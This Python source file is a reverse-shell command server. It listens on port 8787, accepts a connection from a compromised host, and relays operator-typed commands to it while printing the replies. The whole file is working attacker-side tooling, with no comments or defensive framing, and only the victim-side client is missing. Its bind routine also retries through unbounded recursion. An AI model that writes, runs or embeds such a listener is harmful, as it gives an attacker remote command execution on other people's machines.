import socket
import sys

HOST = ''           # Server address
PORT = 8787         # Server port


class RShellServer:
    def __init__(self, host, port):
        self._host = host
        self._port = port
        try:
            self._s = socket.socket()
        except socket.error as msg:
            print("Socket creation error: " + str(msg))

    def socket_bind(self):
        try:
            print("Binding socket to port: " + str(self._port))
            self._s.bind((self._host, self._port))
            self._s.listen(5)
        except socket.error as msg:
            print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
            self.socket_bind()

    def socket_accept(self):
        conn, address = self._s.accept()
        print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
        self._send_commands(conn)
        conn.close()

    def _send_commands(self, conn):
        client_response = str(conn.recv(1024), "utf-8")
        print(client_response, end="")
        while True:
            cmd = input()
            if cmd == 'quit':
                conn.close()
                self._s.close()
                sys.exit()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(1024), "utf-8")
                print(client_response, end="")


if __name__ == '__main__':
    server = RShellServer(HOST, PORT)
    server.socket_bind()
    server.socket_accept()
